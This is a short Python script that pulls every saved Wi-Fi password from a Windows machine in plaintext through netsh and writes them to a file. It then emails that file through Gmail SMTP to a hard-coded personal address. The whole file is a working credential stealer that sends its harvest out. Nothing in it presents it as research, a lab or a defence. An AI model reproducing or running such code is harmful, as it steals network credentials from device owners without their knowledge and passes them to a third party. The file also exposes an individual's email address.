import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import subprocess
import sys
import time

#code
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]
sys.stdout = open('D:\PROJECTS-Misc\wifi-password-extraction-sending-mail\output.txt','wt')

for wifi in wifis:
    result = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profiles', wifi, 'Key=clear']).decode('utf-8').split('\n')
    results = [line.split(':')[1][1:-1]
               for line in result if "Key Content" in line]
    try:
        print(f'Name: {wifi}, Password: {results[0]}')
    except IndexError:
        print(f'Name: {wifi}, Password: Open' )
sys.stdout.close()
#cdoe---end

time.sleep(2)

fromaddr = "yourprogramtest@gmail.com"
toaddr = "prasannanimbalkar163@gmail.com"

with open('message.txt', 'r') as f:
    message =f.read()

with open('password.txt', 'r') as f:
    password = f.read()


msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Test Mail"
body = message
msg.attach(MIMEText(body, 'plain'))


# Attachment to mail  -- start
filename = "output.txt"
attachment = open("D:\PROJECTS-Misc\wifi-password-extraction-sending-mail\output.txt", "rb") 
p = MIMEBase('application', 'octet-stream') 
p.set_payload((attachment).read()) 
encoders.encode_base64(p)

p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
msg.attach(p) 
# Attachment to mail  -- stop



server = smtplib.SMTP('smtp.gmail.com', 25)
server.connect("smtp.gmail.com", 587)
server.ehlo()
server.starttls()
server.ehlo()
server.login(fromaddr, password)
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()